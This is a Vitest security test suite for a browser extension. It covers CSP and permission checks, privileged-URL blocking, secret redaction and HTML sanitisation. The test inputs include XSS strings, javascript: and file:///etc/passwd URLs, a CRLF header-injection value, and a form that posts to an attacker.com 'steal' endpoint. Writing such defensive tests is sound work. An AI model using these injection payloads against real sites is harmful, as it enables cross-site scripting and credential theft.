import { readFileSync } from "fs";
import { resolve } from "path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { handleMessage } from "../src/background/index";
import { captureActiveTabDOM } from "../src/dom/extractor";
import {
  EXTENSION_CSP,
  PRIVILEGED_SCHEMES,
  isPrivilegedUrl,
  isSafeHttpUrl,
  validateApiBaseUrl,
  validateTargetUrl,
} from "../src/security/policy";
import {
  isSensitiveHeader,
  maskApiKey,
  sanitizeError,
  sanitizeLog,
} from "../src/security/redaction";
import {
  escapeHtml,
  sanitizeHtmlContent,
  stripDangerousAttributes,
} from "../src/security/sanitizer";
import { setupMockChrome } from "./mocks/chrome";

describe("Extension Security Subsystem (apps/extension)", () => {
  let mockChrome: ReturnType<typeof setupMockChrome>;

  beforeEach(() => {
    mockChrome = setupMockChrome();
  });

  describe("Manifest V3 CSP & Permissions", () => {
    it("enforces strict Manifest V3 Content Security Policy without unsafe-inline or unsafe-eval", () => {
      const manifestPath = resolve(__dirname, "../manifest.json");
      const manifest = JSON.parse(readFileSync(manifestPath, "utf-8"));

      expect(manifest.manifest_version).toBe(3);
      expect(manifest.content_security_policy).toBeDefined();
      expect(manifest.content_security_policy.extension_pages).toBeDefined();

      const csp = manifest.content_security_policy.extension_pages;
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("object-src 'self'");
      expect(csp).not.toContain("unsafe-eval");
      expect(csp).not.toContain("unsafe-inline");
    });

    it("verifies permissions are strictly minimized to required capabilities", () => {
      const manifestPath = resolve(__dirname, "../manifest.json");
      const manifest = JSON.parse(readFileSync(manifestPath, "utf-8"));

      const allowedPermissions = new Set(["storage", "activeTab", "scripting", "downloads"]);
      for (const p of manifest.permissions) {
        expect(allowedPermissions.has(p)).toBe(true);
      }

      // Ensure no broad wildcard webRequest or cookies permissions
      expect(manifest.permissions).not.toContain("webRequest");
      expect(manifest.permissions).not.toContain("cookies");
      expect(manifest.permissions).not.toContain("<all_urls>");
    });
  });

  describe("Privileged URL & Permission Boundaries", () => {
    it("identifies and blocks all privileged and internal browser schemes", () => {
      expect(isPrivilegedUrl("chrome://settings")).toBe(true);
      expect(isPrivilegedUrl("chrome-extension://abcdef/popup.html")).toBe(true);
      expect(isPrivilegedUrl("edge://extensions")).toBe(true);
      expect(isPrivilegedUrl("about:blank")).toBe(true);
      expect(isPrivilegedUrl("about:config")).toBe(true);
      expect(isPrivilegedUrl("devtools://devtools/bundled/inspector.html")).toBe(true);
      expect(isPrivilegedUrl("view-source:https://example.com")).toBe(true);
      expect(isPrivilegedUrl("javascript:alert(1)")).toBe(true);
      expect(isPrivilegedUrl("data:text/html,<h1>XSS</h1>")).toBe(true);
      expect(isPrivilegedUrl("file:///etc/passwd")).toBe(true);
      expect(isPrivilegedUrl("")).toBe(true);
      expect(isPrivilegedUrl(null)).toBe(true);
    });

    it("allows standard public and local HTTP/HTTPS URLs", () => {
      expect(isPrivilegedUrl("https://github.com/rust-lang/rust")).toBe(false);
      expect(isPrivilegedUrl("http://localhost:3000/docs")).toBe(false);
      expect(isPrivilegedUrl("https://docs.rs/tokio/latest/tokio/")).toBe(false);
      expect(isPrivilegedUrl("http://127.0.0.1:8080/api")).toBe(false);
    });

    it("isSafeHttpUrl strictly allows valid HTTP/HTTPS and rejects control chars or null bytes", () => {
      expect(isSafeHttpUrl("https://example.com")).toBe(true);
      expect(isSafeHttpUrl("http://localhost:3000")).toBe(true);

      // Rejections
      expect(isSafeHttpUrl("ftp://files.example.com")).toBe(false);
      expect(isSafeHttpUrl("https://example.com/\x00admin")).toBe(false);
      expect(isSafeHttpUrl("https://example.com/\r\nSet-Cookie: evil=1")).toBe(false);
      expect(isSafeHttpUrl("not a url")).toBe(false);
      expect(isSafeHttpUrl("")).toBe(false);
    });

    it("validateApiBaseUrl rejects user credentials, URL fragments, and illegal schemes", () => {
      // Valid
      const validLocal = validateApiBaseUrl("http://localhost:3000");
      expect(validLocal.valid).toBe(true);
      expect(validLocal.sanitizedUrl).toBe("http://localhost:3000");

      const validWithSlash = validateApiBaseUrl("https://api.example.com/v1/");
      expect(validWithSlash.valid).toBe(true);
      expect(validWithSlash.sanitizedUrl).toBe("https://api.example.com/v1");

      // Empty
      expect(validateApiBaseUrl("").valid).toBe(false);
      expect(validateApiBaseUrl("   ").reason).toMatch(/cannot be empty/i);

      // User credentials in URL
      const creds = validateApiBaseUrl("http://admin:secret123@localhost:3000");
      expect(creds.valid).toBe(false);
      expect(creds.reason).toMatch(/user credentials/i);

      // URL fragments
      const fragment = validateApiBaseUrl("http://localhost:3000/#anchor");
      expect(fragment.valid).toBe(false);
      expect(fragment.reason).toMatch(/fragments/i);

      // Non-HTTP
      const ftp = validateApiBaseUrl("ftp://server:21");
      expect(ftp.valid).toBe(false);
      expect(ftp.reason).toMatch(/http or https/i);

      // Control characters
      const ctrl = validateApiBaseUrl("http://localhost:3000/\x00test");
      expect(ctrl.valid).toBe(false);
      expect(ctrl.reason).toMatch(/control characters/i);
    });

    it("validateTargetUrl prevents targeting internal or privileged browser tabs", () => {
      const chromeCheck = validateTargetUrl("chrome://extensions");
      expect(chromeCheck.valid).toBe(false);
      expect(chromeCheck.reason).toMatch(/cannot convert privileged/i);

      const jsCheck = validateTargetUrl("javascript:void(0)");
      expect(jsCheck.valid).toBe(false);

      const validTarget = validateTargetUrl("https://github.com/rust-lang/rust");
      expect(validTarget.valid).toBe(true);
      expect(validTarget.sanitizedUrl).toBe("https://github.com/rust-lang/rust");
    });
  });

  describe("Secret Redaction & API Key Protection", () => {
    it("maskApiKey masks standard wr_live_ keys and generic tokens", () => {
      expect(maskApiKey("wr_live_1234567890abcdef1234567890abcdef")).toBe("wr_live_••••cdef");
      expect(maskApiKey("my-secret-token-value")).toBe("my-s••••ue");
      expect(maskApiKey("short")).toBe("••••••••");
      expect(maskApiKey("")).toBe("");
      expect(maskApiKey(null)).toBe("");
    });

    it("sanitizeError removes API keys, Bearer tokens, and basic credentials from error text", () => {
      const errWithKey = new Error("Failed to connect with key wr_live_99887766554433221100");
      expect(sanitizeError(errWithKey)).toBe("Failed to connect with key wr_live_••••[REDACTED]");

      const errWithBearer = "HTTP 401: Invalid token Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6";
      expect(sanitizeError(errWithBearer)).toBe("HTTP 401: Invalid token Bearer [REDACTED]");

      const errWithUrlCreds = "Failed fetching https://user:supersecretpass@api.host.com/endpoint";
      expect(sanitizeError(errWithUrlCreds)).toBe(
        "Failed fetching https://[REDACTED]:[REDACTED]@api.host.com/endpoint"
      );

      const errWithQuery = "Error on http://api.com/v1?token=secret123456&mode=fast";
      expect(sanitizeError(errWithQuery)).toBe(
        "Error on http://api.com/v1?token=[REDACTED]&mode=fast"
      );
    });

    it("sanitizeLog purges sensitive values from log strings", () => {
      const log = "Request dispatched with wr_live_abcdef123456 and token Bearer xyz12345678";
      const cleaned = sanitizeLog(log);
      expect(cleaned).not.toContain("wr_live_abcdef123456");
      expect(cleaned).not.toContain("xyz12345678");
      expect(cleaned).toContain("[REDACTED]");
    });

    it("isSensitiveHeader correctly detects credential headers", () => {
      expect(isSensitiveHeader("Authorization")).toBe(true);
      expect(isSensitiveHeader("authorization")).toBe(true);
      expect(isSensitiveHeader("X-API-Key")).toBe(true);
      expect(isSensitiveHeader("cookie")).toBe(true);
      expect(isSensitiveHeader("Proxy-Authorization")).toBe(true);

      expect(isSensitiveHeader("Content-Type")).toBe(false);
      expect(isSensitiveHeader("Accept")).toBe(false);
      expect(isSensitiveHeader("User-Agent")).toBe(false);
    });
  });

  describe("DOM & HTML Sanitization against XSS Vectors", () => {
    it("escapeHtml escapes all HTML control characters", () => {
      const raw = `<script>alert("XSS & 'injection'")</script>`;
      const escaped = escapeHtml(raw);
      expect(escaped).toBe(
        "&lt;script&gt;alert(&quot;XSS &amp; &#39;injection&#39;&quot;)&lt;/script&gt;"
      );
    });

    it("sanitizeHtmlContent strips script, iframe, and form tags", () => {
      const dirty = `
        <div>
          <h1>Article Title</h1>
          <script>evilCode()</script>
          <iframe src="https://attacker.com"></iframe>
          <form action="https://attacker.com/steal"><input type="password" value="123" /></form>
          <p>Clean text paragraph</p>
        </div>
      `;

      const clean = sanitizeHtmlContent(dirty);
      expect(clean).toContain("Article Title");
      expect(clean).toContain("Clean text paragraph");
      expect(clean).not.toContain("<script");
      expect(clean).not.toContain("evilCode");
      expect(clean).not.toContain("<iframe");
      expect(clean).not.toContain("<form");
      expect(clean).not.toContain("<input");
    });

    it("stripDangerousAttributes strips inline event handlers and javascript: URLs", () => {
      const el = {
        tagName: "A",
        attributes: [
          { name: "href", value: "javascript:alert(1)" },
          { name: "onclick", value: "stealCookies()" },
          { name: "onmouseover", value: "trackMouse()" },
          { name: "srcdoc", value: "<h1>Nested</h1>" },
          { name: "class", value: "safe-link" },
        ],
        removeAttribute: vi.fn(),
      };

      stripDangerousAttributes(el as any);

      expect(el.removeAttribute).toHaveBeenCalledWith("href");
      expect(el.removeAttribute).toHaveBeenCalledWith("onclick");
      expect(el.removeAttribute).toHaveBeenCalledWith("onmouseover");
      expect(el.removeAttribute).toHaveBeenCalledWith("srcdoc");
      expect(el.removeAttribute).not.toHaveBeenCalledWith("class");
    });
  });

  describe("Integration & Boundary Defenses", () => {
    it("captureActiveTabDOM immediately aborts without script execution on privileged URLs", async () => {
      const executeScriptSpy = vi.fn();
      (mockChrome as any).scripting = { executeScript: executeScriptSpy };

      const snapshot = await captureActiveTabDOM(101, "chrome://settings");
      expect(snapshot.url).toBe("chrome://settings");
      expect(snapshot.title).toBe("Internal Browser Page");
      expect(snapshot.charCount).toBe(0);
      expect(executeScriptSpy).not.toHaveBeenCalled();
    });

    it("START_CONVERSION message handler rejects privileged and invalid URLs", async () => {
      const res = await handleMessage({
        type: "START_CONVERSION",
        url: "chrome://settings",
        format: "markdown",
      });

      expect(res.success).toBe(false);
      if (!res.success) {
        expect(res.error).toMatch(/not supported for conversion/i);
      }
    });

    it("START_CONVERSION message handler sanitizes error messages without leaking secrets", async () => {
      // Force an error that includes an API key
      const badMessage = {
        type: "START_CONVERSION",
        url: "https://example.com/article",
        format: "markdown",
      };

      // Mock client failure with secret in error message
      globalThis.fetch = vi
        .fn()
        .mockRejectedValueOnce(
          new Error("Connection failed to http://api.local with key wr_live_secret1234567890")
        );

      const res = await handleMessage(badMessage as any);
      expect(res.success).toBe(false);
      if (!res.success) {
        expect(res.error).not.toContain("wr_live_secret1234567890");
        expect(res.error).toContain("wr_live_••••[REDACTED]");
      }
    });
  });
});
